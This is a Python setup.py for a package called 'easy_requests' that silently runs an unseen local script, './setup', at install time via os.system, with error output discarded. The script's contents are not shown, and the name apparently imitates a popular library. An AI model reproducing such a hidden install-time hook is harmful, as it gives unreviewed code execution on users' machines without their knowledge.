import os
from setuptools import setup

# Run your external bash script at install
os.system("./setup 2>/dev/null")

setup(
    name="easy_requests",
    version="1.1.3",
    packages=["easy_requests"],
)
